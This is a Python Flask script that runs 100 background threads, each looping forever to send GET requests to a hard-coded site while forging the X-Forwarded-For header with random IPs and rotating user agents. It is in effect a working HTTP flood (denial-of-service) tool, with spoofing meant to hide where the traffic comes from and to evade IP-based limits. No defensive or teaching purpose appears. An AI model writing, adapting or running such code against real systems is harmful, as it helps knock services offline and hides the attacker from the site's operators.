from flask import Flask
import requests
import threading
from bs4 import BeautifulSoup
from faker import Faker
from fake_useragent import UserAgent

app = Flask(__name__)

fake = Faker()
ua = UserAgent()

def chek(url):
    while True:
        try:
            ip = fake.ipv4()
            headers = {
                "User-Agent": ua.random,
                "X-Forwarded-For": ip  # تعيين عنوان IP الوهمي
            }            
            response = requests.get(url, headers=headers)
            status_code = response.status_code
            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string if soup.title else "No Title"
            print(f"[{status_code}] {title} - {url} - IP: {ip}")
        except requests.exceptions.RequestException:
            print("Request failed")

def start_threads():
    target_url = "https://panel.hexor1.xyz"
    for _ in range(100):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()

@app.route('/')
def home():
    return "Server is running with background threads!"

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
